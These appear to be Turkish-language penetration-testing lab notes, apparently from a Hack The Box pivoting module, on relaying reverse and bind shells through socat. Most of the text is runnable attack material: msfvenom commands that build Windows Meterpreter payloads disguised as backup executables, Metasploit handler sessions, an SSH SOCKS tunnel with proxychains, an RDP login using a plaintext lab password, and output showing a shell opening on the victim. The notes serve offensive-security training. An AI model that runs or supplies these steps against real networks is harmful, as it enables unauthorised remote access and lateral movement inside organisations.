# socat

`Socat`, `SSH` tünelleme kullanmaya gerek kalmaksızın, birbirinden bağımsız iki ağ kanalı arasında boru soketleri (`pipe sockets`) oluşturabilen çift yönlü bir aktarım aracıdır.

## Reverse Shell ile Socat Yönlendirmesi


### socat dinleyicisi açma (B Makinasında)

```bash
# ubuntu@Webserver:~$ B Makinası
# TCP4:10.10.15.12:80 A Makinası ve portu
# B Makinasındaki 8080 portuna gelen trafiği A Makinasındaki 80 portuna Yönlendirmiş 
socat TCP4-LISTEN:8080,fork TCP4:10.10.15.12:80

```

***zira Socat bir hedeften bağlantı aldığı anda, tüm trafiği saldırı makinemizdeki bu dinleyiciye yönlendirecek ve böylece bir kabuk (shell) elde etmemizi sağlayacaktır.***


### Creating the Windows Payload (A Makinasında)


> **🚨 Çok Dikkat:** **LHOST ve LPORT B Makinasının içindeki windowsa erişim sağladığımız ağ ip-adresi `ifconfig içindeki 2. ip adres`**

```bash
# suslu7616@htb[/htb]$
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


### Starting MSF Console A Makinasında

```bahs
msfconsole -q

msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

### Payloadı Wİndowsa Gönder ve Çalıştır Sonra Shell Düşer

> **🚨 Dikkat:** payloadı Göndermek için Önce **A** Makinasında `ssh -D 9050 ubuntu@10.129.15.28
` **B-Makina-İp ve B-Makina-Username**
> Sonra ProxyChanins İle `proxychains4 xfreerdp3 /v:172.16.5.19:3389 /u:victor /p:pass@123 /cert:ignore +clipboard
`



```bash
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

## Bind Shell ile Socat Yönlendirmesi

`socat` ile oluşturduğumuz ters bağlantı (reverse shell) yönlendiricisine benzer şekilde, bir `socat` "bind shell" (bağlantı kabul eden kabuk) yönlendiricisi de oluşturabiliriz. Bu yöntem, Windows sunucusundan Ubuntu sunucusuna geri bağlantı kuran ve oradan saldırı makinemize yönlendirilen ters bağlantılardan farklıdır. "Bind shell" senaryosunda, Windows sunucusu bir dinleyici (listener) başlatır ve belirli bir porta bağlanır (portu dinlemeye başlar). Windows için bir "bind shell" yükü (payload) oluşturup bunu Windows ana bilgisayarında çalıştırabiliriz. Aynı zamanda, Ubuntu sunucusu üzerinde, Metasploit "bind handler"ından gelen bağlantıları dinleyecek ve bunları Windows hedefindeki "bind shell" yüküne iletecek bir `socat` yönlendiricisi kurabiliriz. Aşağıdaki şekil, bu yönlendirme (pivot) sürecini çok daha iyi açıklayacaktır.


![socat-bind-shell](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/158/55.png)


```bash
# A-Makinası
# suslu7616@htb[/htb]$
# lport=C-makinasındaki dinleyeceğimiz port

msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

```bash
# B-Makinasında
# ubuntu@webserver$
# C-Makinasının 172.16.5.19:8443

socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Son olarak, bir **Metasploit** bağlayıcı işleyici başlatabiliriz. Bu bağlayıcı işleyici, **8080** portunda **socat** dinleyicimize bağlanacak şekilde yapılandırılabilir Ubuntu sunucusu



```bash
#A-Makinası
# lhost lport B Makinası

msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```
